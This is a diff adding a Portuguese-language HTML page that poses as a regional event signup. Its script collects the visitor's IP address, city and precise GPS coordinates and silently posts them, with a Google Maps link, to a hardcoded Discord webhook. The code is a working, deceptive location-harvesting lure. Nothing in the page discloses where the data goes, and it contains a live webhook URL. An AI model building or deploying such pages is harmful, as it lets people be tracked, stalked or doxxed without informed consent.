@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Evento de Localização</title>
+</head>
+<body>
+  <h2>📍 Evento Regional</h2>
+  <p>Para participar, autorize sua localização.</p>
+  <button onclick="go()">Permitir localização</button>
+
+<script>
+async function go() {
+  const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>null);
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+
+    await fetch("https://discord.com/api/webhooks/1465862095399817288/GcmIkAw0qPum20GWqxT0Y1XqOswQ2SFHKu4yATRrVV0cdWV8A1R3ohUDTRmD_XV7S_ez", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        content:
+`📡 Nova localização
+IP: ${ipData?.ip}
+País: ${ipData?.country_name}
+Cidade: ${ipData?.city}
+
+GPS:
+Lat: ${lat}
+Lon: ${lon}
+Precisão: ${acc} m
+🗺️ https://maps.google.com/?q=${lat},${lon}`
+      })
+    });
+
+    alert("✅ Localização enviada!");
+  }, () => alert("❌ Permissão negada"));
+}
+</script>
+</body>
+</html>
